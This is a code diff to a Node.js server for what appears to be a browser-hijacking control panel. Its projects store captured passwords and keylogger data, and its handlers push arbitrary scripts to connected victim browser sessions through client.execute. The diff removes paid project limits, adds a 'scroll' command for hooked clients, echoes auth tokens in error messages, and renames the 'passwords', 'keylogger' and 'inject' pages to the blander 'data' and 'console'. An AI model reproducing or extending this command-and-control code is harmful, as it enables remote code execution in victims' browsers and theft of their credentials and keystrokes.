@@ -187,10 +187,6 @@ MongoClient.connect(config.mongodb, (err, client) => {
               users.insertOne({
                 username: user.login,
                 id: user.id,
-                payment: {
-                  account_type: 'free',
-                  method: 'none'
-                },
                 github: user,
                 logins: [{
                   timestamp: new Date(),
@@ -238,21 +234,6 @@ MongoClient.connect(config.mongodb, (err, client) => {
                 'permissions.owners': user.id
               }]
             }).count().then((count: number) => {
-              let restriction = 3
-              if (dbUser.payment.account_type.toLowerCase() === 'pro') restriction = 35
-              if (dbUser.payment.account_type.toLowerCase() === 'elite') restriction = 350
-              let remaining: any = +restriction - count
-
-              if (config.superusers.includes(dbUser.id)) {
-                remaining = '∞'
-              } else if (restriction !== 0 && count >= restriction) {
-                reject({
-                  title: 'Upgrade account',
-                  message: `Your ${dbUser.payment.account_type.toLowerCase()} account is limited to ${restriction} projects (using ${count})`,
-                  id: 'upgrade'
-                })
-                return
-              }
               projects.findOne({
                 name: project
               }).then(doc => {
@@ -272,11 +253,12 @@ MongoClient.connect(config.mongodb, (err, client) => {
                       },
                       created_at: new Date()
                     },
-                    inject: {
+                    console: {
                       autoexecute: ''
                     },
-                    passwords: [],
-                    keylogger: []
+                    data: {
+                      passwords: []
+                    }
                   }, (err, res) => {
                     if (err) {
                       throw err
@@ -290,7 +272,7 @@ MongoClient.connect(config.mongodb, (err, client) => {
                       )
                       resolve({
                         title: 'Project created',
-                        message: `Created project '${project}', ${remaining} slots remaining`
+                        message: `Created project '${project}'`
                       })
                     }
                   })
@@ -531,7 +513,8 @@ MongoClient.connect(config.mongodb, (err, client) => {
           console.log(chalk.redBright('[auth:github/token] '), error.message)
           socket.emit('auth:github/stale', {
             title: error.title.toString(),
-            message: error.message.toString()
+            message: error.message.toString(),
+            token
           })
         })
       }
@@ -608,7 +591,7 @@ MongoClient.connect(config.mongodb, (err, client) => {
         project,
         page
       } = data
-      let pages = ['overview', 'passwords', 'keylogger', 'inject', 'config']
+      let pages = ['overview', 'console', 'data', 'config']
 
       if (globalToken) {
         if (project && page && pages.includes(page)) {
@@ -1175,9 +1158,10 @@ MongoClient.connect(config.mongodb, (err, client) => {
         token,
         id,
         script,
+        scroll,
         recursive
       } = data
-      if (project && (recursive || (typeof token === 'string' && (typeof id === 'string' || typeof id === 'undefined'))) && typeof script === 'string' && globalToken) {
+      if (project && (recursive || (typeof token === 'string' && (typeof id === 'string' || typeof id === 'undefined'))) && (typeof script === 'string' || scroll)  && globalToken) {
         getUser(globalToken).then(user => {
           getProject(project, user).then(thisProject => {
             if (inject.clients[thisProject.doc['_id']]) {
@@ -1185,7 +1169,11 @@ MongoClient.connect(config.mongodb, (err, client) => {
                 Object.keys(inject.clients[thisProject.doc['_id']]).forEach(token => {
                   if (inject.clients[thisProject.doc['_id']][token] && inject.clients[thisProject.doc['_id']][token].sessions) {
                     inject.clients[thisProject.doc['_id']][token].sessions.forEach(client => {
-                      client.execute(script)
+                      if (scroll) {
+                        client.scroll(script)
+                      } else {
+                        client.execute(script)
+                      }
                     })
                   }
                 })
@@ -1193,7 +1181,11 @@ MongoClient.connect(config.mongodb, (err, client) => {
                 if (inject.clients[thisProject.doc['_id']][token] && inject.clients[thisProject.doc['_id']][token].sessions) {
                   inject.clients[thisProject.doc['_id']][token].sessions.forEach(client => {
                     if (client) {
-                      client.execute(script)
+                      if (scroll) {
+                        client.scroll(script)
+                      } else {
+                        client.execute(script)
+                      }
                     }
                   })
                 } else {
@@ -1206,7 +1198,11 @@ MongoClient.connect(config.mongodb, (err, client) => {
                 if (inject.clients[thisProject.doc['_id']][token] && inject.clients[thisProject.doc['_id']][token].sessions) {
                   let client = inject.clients[thisProject.doc['_id']][token].sessions.find(c => c.id === id)
                   if (client) {
-                    client.execute(script)
+                    if (scroll) {
+                      client.scroll(script)
+                    } else {
+                      client.execute(script)
+                    }
                   } else {
                     socket.emit('err', {
                       title: 'Failed to execute!',
@@ -1699,7 +1695,7 @@ MongoClient.connect(config.mongodb, (err, client) => {
     })
     app.use('/*', (req, res) => {
       if (req.url.substr(0, 9) === '/cdn-cgi/') return
-      if (req.originalUrl === '/config') req.originalUrl = '/'
+      if (/^\/settings|\/documentation$/.test(req.originalUrl)) req.originalUrl = '/'
       request('http://localhost:8080' + req.originalUrl).pipe(res)
     })
   } else {
@@ -1716,7 +1712,7 @@ MongoClient.connect(config.mongodb, (err, client) => {
         res.sendFile(path.join(__dirname, '../interface/public/index.html'))
       }
     })
-    app.use('/config', (req, res) => {
+    app.get(['/settings', '/documentation'], (req, res) => {
       res.sendFile(path.join(__dirname, '../interface/public/index.html'))
     })
     app.use(express.static(path.join(__dirname, '../interface/public')))
